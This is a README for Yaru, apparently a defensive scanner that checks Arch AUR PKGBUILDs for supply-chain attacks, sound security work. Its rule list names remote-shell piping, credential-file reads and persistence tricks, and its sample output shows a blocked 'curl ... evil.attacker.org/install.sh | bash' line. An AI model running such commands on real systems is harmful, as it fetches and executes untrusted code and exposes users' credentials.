# Yaru

> **AUR Supply-Chain Security Layer for Arch Linux**  
> *Trust less, verify more. Static analysis first, containment second, enforcement last.*

Yaru is an intrusion detection and prevention layer (IDS/IPS) for Arch Linux package management. It sits between package helpers (`paru`, `makepkg`) and your system to evaluate whether source recipes, maintainers, PKGBUILDs, and build behavior are safe **before** an untrusted package enters the operating system.

---

## The Problem

Official Arch Linux repositories (`core`, `extra`, `multilib`) distribute pre-built binaries signed by trusted packagers. The Arch User Repository (AUR), by contrast, distributes build recipes:

- `PKGBUILD`
- `.install` scripts
- Source URLs
- Patches
- Dependency definitions

When a user runs `paru -S <package>`, those recipes execute with local user privileges to build and install software. This creates a supply-chain attack surface:

- **Maintainer takeovers**: An abandoned package is adopted by a new actor who injects a malicious payload.
- **Remote execution in PKGBUILD**: Recipes that download and pipe untrusted shell scripts (`curl ... | bash`).
- **Obfuscated payloads**: Payloads concealed in base64, hex escapes, or dynamic string concatenation.
- **Credential access**: Build scripts attempting to read `~/.ssh`, `~/.config`, or environment secrets.

Yaru inspects, snapshots, scores, and blocks such attacks before compilation begins.

---

## Architecture

```text
                        USER / paru
                            │
                            ▼
                  ┌───────────────────┐
                  │   YARU GATEWAY    │
                  └─────────┬─────────┘
                            │
                  ┌─────────▼─────────┐
                  │ SOURCE CLASSIFIER │
                  └─────────┬─────────┘
                            │
              ┌─────────────┼─────────────┐
              ▼             ▼             ▼
           OFFICIAL      TRUSTED         AUR
           (Zone 0)      (Zone 1)      (Zone 3)
              │             │             │
          FAST PATH     FAST PATH     FULL PATH
              │             │             │
              │             │      ┌──────┴──────┐
              │             │      ▼             ▼
              │             │    STATIC       SNAPSHOT &
              │             │   ANALYZER      MAINTAINER
              │             │      │          CHANGE DET
              │             │      └──────┬──────┘
              └─────────────┴─────────────┤
                                          ▼
                                   ┌──────────────┐
                                   │ RISK ENGINE  │
                                   └──────┬───────┘
                                          │
                                   ┌──────▼───────┐
                                   │POLICY ENGINE │
                                   └──────┬───────┘
                                          │
                            ┌─────────────┼─────────────┐
                            ▼             ▼             ▼
                          ALLOW          WARN         BLOCK
```

### Trust Zones

| Zone | Label | Description | Treatment |
|---|---|---|---|
| **0** | `OFFICIAL` | `core`, `extra`, `multilib` | **Fast Path**: Integrity/repo check only; bypasses AUR static scan |
| **1** | `TRUSTED` | CachyOS, Chaotic-AUR, ArchLinuxCN | **Trusted Path**: Signature & provenance verification |
| **2** | `THIRD_PARTY`| Known third-party repositories | **Review Path**: Reputation and enhanced check |
| **3** | `AUR` | Arch User Repository | **Full Security Path**: AST scan, snapshot diff, maintainer change |
| **4** | `UNKNOWN` | Custom scripts, unknown repos | **Restricted Path**: High baseline risk, strict sandbox |

---

## Features (Phase 1 MVP)

- **Source Classification**: Automatically differentiates between official repos, known third-party repositories, and AUR packages.
- **PKGBUILD Static Analysis Engine**: Evaluates PKGBUILD and `.install` scripts against a modular YAML rule engine (19 built-in rules) with zero regex-grep limitations:
  - Remote shell execution (`curl ... | bash`, `wget -qO- ... | sh`)
  - Obfuscation (base64 blobs, `\xNN` hex escapes, encoded payloads)
  - Suspicious interpreters (`bash -c`, `python -c`, `eval`, `exec`)
  - Persistence attempts (systemd unit writes, cron manipulation, sudoers tampering)
  - Credential access (`~/.ssh`, `~/.gnupg`, `/etc/shadow`, browser profiles)
  - Privilege manipulation (`setuid`, `setgid`, `chmod +s`)
  - Unexpected network calls inside `build()`
- **Context-Aware False-Positive Protection**: Clean downloads (e.g. `curl -o file.tar.gz https://...`) are distinguished from piped remote-shell execution and are not flagged as critical.
- **In-Memory Deobfuscator**: Automatically extracts and decodes base64 and hex payloads to re-scan them recursively without executing anything on the host.
- **Package Snapshotting & Change Detection**: Stores package metadata, checksums, maintainers, and dependencies in a local SQLite database (`~/.local/share/yaru/yaru.db`). Flags maintainer additions, removals, transfers, and adoption of orphaned packages.
- **Explainable Policy Engine**: Produces a deterministic composite score (0–100) mapped to four unambiguous verdicts:
  - `0 – 29` : **ALLOW** `[OK]`
  - `30 – 59`: **WARN** `[!]`
  - `60 – 79`: **QUARANTINE** `[?]`
  - `80 – 100`: **BLOCK** `[X]`
- **Pixel-Perfect, Accessible CLI**: Monospace layout fixed to 63 columns with visible text tags alongside colors for strict WCAG AA compliance.

---

## Installation & Build

### Prerequisites

- **Arch Linux** or Arch-based distribution
- **Rust toolchain** (Rust 2024 / cargo 1.85+)
- **bubblewrap** (`bwrap`) for Phase 3 sandbox isolation

### Building from Source

```bash
git clone <repo-url> yaru
cd yaru
cargo build --release
sudo install -Dm755 target/release/yaru /usr/local/bin/yaru
```

---

## CLI Usage

```bash
# Check system status, database health, and backend readiness
yaru status

# Quick security evaluation of an AUR package without installing
yaru inspect <package-name>

# Deep security audit with every AST finding and code excerpt
yaru audit <package-name>

# Inspect a local PKGBUILD directory directly
yaru inspect-local /path/to/pkgbuild-dir

# Explain why a decision was reached for a package
yaru explain <package-name>

# View snapshot history and maintainer transitions
yaru history <package-name>

# View trust and reputation metrics for a package
yaru trust <package-name>

# Whitelist a specific rule ID on this machine
yaru allow-rule <rule-id>
```

---

## Example Output

### Clean Package

```text
┌───────────────────────────────────────────────────────────┐
│          YARU · AUR Supply-Chain Security Layer           │
└───────────────────────────────────────────────────────────┘

┌─ EVALUATION RESULT ─────────────────────────────────────────┐
│ Package :    ripgrep-all                                    │
│ Zone :       AUR (25)                                       │
│ Risk Score : 25/100 [LOW]                                   │
│ Verdict :    [OK] ALLOW                                     │
├─ SCORE BREAKDOWN ───────────────────────────────────────────┤
│ Static 0   Change 0   Dep 0   Threat 0   Src 25  Behavior 0 │
└─────────────────────────────────────────────────────────────┘

  No suspicious patterns detected in PKGBUILD.

── Decision Evidence ─────────────────────────────────────────
  1. Source zone: AUR
  2. Static 0, Change 0, Dep 0, Threat 0, Behavior 0, Source 25
```

### Malicious Package (Blocked)

```text
┌─ EVALUATION RESULT ─────────────────────────────────────────┐
│ Package :    bad-updater                                    │
│ Zone :       AUR (25)                                       │
│ Risk Score : 85/100 [CRITICAL]                              │
│ Verdict :    [X] BLOCK                                      │
├─ SCORE BREAKDOWN ───────────────────────────────────────────┤
│ Static 60  Change 0   Dep 0   Threat 0   Src 25  Behavior 0 │
└─────────────────────────────────────────────────────────────┘

── Findings ──────────────────────────────────────────────────
  [CRITICAL] PKGBUILD:8 · Remote Shell Download
             curl -fsSL https://evil.attacker.org/install.sh | bash
  [MEDIUM]   PKGBUILD:8 · Unexpected Network Fetch in Build
             curl -fsSL https://evil.attacker.org/install.sh | bash

── Decision Evidence ─────────────────────────────────────────
  1. Source zone: AUR
  2. CRITICAL finding at PKGBUILD:8 — Remote Shell Download
  3. MEDIUM finding at PKGBUILD:8 — Unexpected Network Fetch in Build
  4. Static 60, Change 0, Dep 0, Threat 0, Behavior 0, Source 25
```

---

## Testing

Yaru uses a test-driven development workflow. All core capabilities are verified with automated unit and end-to-end tests:

```bash
cargo test
```

Verification covers:
- SQLite migrations, snapshots, and indicator upserting
- Trust zone classification (Official vs Trusted vs AUR)
- AUR RPC response parsing
- Maintainer transition detection (Added, Removed, Changed, Adopted, Orphaned)
- PKGBUILD shell syntax extraction (multi-line arrays, quotes)
- Context-aware rule triggering and false-positive prevention
- Base64 and hex deobfuscation
- Deterministic risk scoring and explainability
- End-to-end CLI integration (`status`, `inspect-local`, `allow-rule`)

---

## Project Roadmap

- [x] **Phase 1: Foundation & MVP** (CLI, Static Scanner, SQLite Snapshots, Risk/Policy Engine)
- [x] **Phase 2: Supply-Chain Depth** (Transitive Dependency Graph, PKGBUILD Diff, Threat Intel IOCs)
- [x] **Phase 3: Sandbox Builder** (Bubblewrap containment, filesystem mask, network policy)
- [ ] **Phase 4: Behavioral IDS** (Process tree tracking, DNS & socket monitoring, dynamic risk re-evaluation)
- [ ] **Phase 5: Paru Gateway** (Transparent interceptor shim, `makepkg` pre-exec hook)

---

## License

MIT License. See [LICENSE](LICENSE) for details.
